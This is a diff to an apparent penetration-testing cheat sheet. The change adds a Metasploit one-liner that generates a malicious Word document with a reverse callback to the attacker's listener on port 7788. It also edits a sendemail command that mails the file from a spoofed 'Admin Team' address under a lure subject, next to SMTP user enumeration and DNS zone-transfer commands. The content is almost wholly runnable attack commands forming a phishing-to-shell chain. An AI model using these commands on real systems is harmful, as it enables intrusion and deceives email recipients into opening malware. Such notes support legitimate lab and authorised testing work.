@@ -757,8 +757,13 @@ ssh $USERNAME@$TARGET -i id_dsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
 telnet --user '$USERNAME' $TARGET
 
 [*] (25) SMTP
++---------- Search ----------+
 nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods={VRFY},userdb=/usr/share/nmap/nselib/data/usernames.lst" $TARGET
 
++---------- Create Malicious File ----------+
+rlwrap msfconsole -q -x 'use exploit/windows/fileformat/office_word_hta; set SRVHOST tun0; set SRVPORT 8080; set LHOST tun0; set LPORT 7788; set FILENAME file.doc; run'
+
++---------- Send ----------+
 sendemail \
         -s $TARGET \
         -f "Admin Team <admin@$DOM>" \
@@ -766,7 +771,7 @@ sendemail \
         -o tls=no \
         -u "Subject: Important Document" \
         -m "This is the document you asked for. Thanks again" \
-        -a "$HOME/.msf4/local/msf.odt"
+        -a "$HOME"/.msf4/local/file.doc
 
 [*] (53) DNS
 dig axfr @$TARGET $DOM
